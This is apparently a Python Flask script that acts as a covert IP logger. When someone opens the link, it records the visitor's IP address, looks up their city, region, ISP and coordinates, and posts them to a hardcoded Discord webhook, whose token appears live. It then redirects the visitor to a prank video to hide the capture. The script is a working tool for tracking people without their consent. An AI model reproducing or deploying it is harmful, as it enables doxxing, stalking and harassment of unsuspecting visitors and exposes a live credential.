from flask import Flask, request, redirect
import requests
import json
import time

#fsdgfdgdfgdfgdfggfdgdfgjfdgfdkgjfdkgfdjkgjkfdgjjfdkjgkfdjkjgjfdkjgkfkjdgjkdfkgjkfdjkgbjkfdkjgjfdjkgjkfdjgkfdjvbkfdgbfdbfdvb
WEBHOOK_URL = "https://discord.com/api/webhooks/1386109952996806767/PzobPiltLc35lQqyDsDiCx5GDVQnCNEJ_48oc4GpKcxjCNWofrJ1wNv8UZcKdQ-m5qf4"  # Replace with your webhook

app = Flask(__name__)

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/")
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def send_to_discord(data):
    embed = {
        "title": "🎯 New Visitor Logged",
        "color": 0xff5733,
        "fields": [
            {"name": "IP Address", "value": data.get("ip", "N/A"), "inline": False},
            {"name": "City", "value": data.get("city", "N/A"), "inline": True},
            {"name": "Region", "value": data.get("region", "N/A"), "inline": True},
            {"name": "Country", "value": data.get("country_name", "N/A"), "inline": True},
            {"name": "ISP", "value": data.get("org", "N/A"), "inline": False},
            {"name": "Location", "value": f"{data.get('latitude', 'N/A')}, {data.get('longitude', 'N/A')}", "inline": False},
        ]
    }

    payload = {"embeds": [embed]}
    headers = {"Content-Type": "application/json"}
    try:
        requests.post(WEBHOOK_URL, json=payload, headers=headers)
    except Exception as e:
        print("Failed to send to Discord:", e)

@app.route("/")
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_info = get_ip_info(ip)
    ip_info["ip"] = ip  # make sure IP is included
    send_to_discord(ip_info)
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
